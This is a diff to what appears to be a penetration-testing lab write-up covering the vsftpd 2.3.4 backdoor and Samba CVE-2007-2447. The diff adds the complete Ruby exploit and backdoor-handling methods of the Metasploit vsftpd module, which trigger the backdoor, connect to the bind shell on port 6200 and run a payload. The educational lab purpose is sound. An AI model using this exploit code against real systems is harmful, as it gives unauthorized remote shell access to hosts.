@@ -93,7 +93,7 @@ Shellcodes: No Results
 Papers: No Results
 ```
 
-The exploit "vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)" looks quite promising since it is the version the target machine is running on it. If you are curious about the exploit in more details, we can drill into it as below.
+The exploit "vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)" looks quite promising since it is the version the target machine is running on it. If you are curious about the exploit in more details, we can drill into it as below. Remember to focus on the function "def exploit" in which it has the actual code to exploit the vulnerability. 
 
 ```bash
 searchsploit -x 17491
@@ -155,7 +155,70 @@ class Metasploit3 < Msf::Exploit::Remote
 
                 register_options([ Opt::RPORT(21) ], self.class)
         end
-# More Ruby Code HERE.....
+
+        def exploit # <===== EXPLOIT
+
+                nsock = self.connect(false, {'RPORT' => 6200}) rescue nil
+                if nsock
+                        print_status("The port used by the backdoor bind listener is already open")
+                        handle_backdoor(nsock)
+                        return
+                end
+
+                # Connect to the FTP service port first
+                connect
+
+                banner = sock.get_once(-1, 30).to_s
+                print_status("Banner: #{banner.strip}")
+
+                sock.put("USER #{rand_text_alphanumeric(rand(6)+1)}:)\r\n")
+                resp = sock.get_once(-1, 30).to_s
+                print_status("USER: #{resp.strip}")
+
+                if resp =~ /^530 /
+                        print_error("This server is configured for anonymous only and the backdoor code cannot be reached")
+                        disconnect
+                        return
+                end
+
+                if resp !~ /^331 /
+                        print_error("This server did not respond as expected: #{resp.strip}")
+                        disconnect
+                        return
+                end
+
+                sock.put("PASS #{rand_text_alphanumeric(rand(6)+1)}\r\n")
+
+                # Do not bother reading the response from password, just try the backdoor
+                nsock = self.connect(false, {'RPORT' => 6200}) rescue nil
+                if nsock
+                        print_good("Backdoor service has been spawned, handling...")
+                        handle_backdoor(nsock)
+                        return
+                end
+
+                disconnect
+
+        end
+
+        def handle_backdoor(s)
+
+                s.put("id\n")
+
+                r = s.get_once(-1, 5).to_s
+                if r !~ /uid=/
+                        print_error("The service on port 6200 does not appear to be a shell")
+                        disconnect(s)
+                        return
+                end
+
+                print_good("UID: #{r.strip}")
+
+                s.put("nohup " + payload.encoded + " >/dev/null 2>&1")
+                handler(s)
+        end
+
+end
 ```
 
 #### samba
@@ -226,7 +289,7 @@ class Metasploit3 < Msf::Exploit::Remote
                                         [ 'CVE', '2007-2447' ],
                                         [ 'OSVDB', '34700' ],
 # More Ruby Code HERE.....
-def exploit
+		def exploit # <===== EXPLOIT
 
                 connect
 
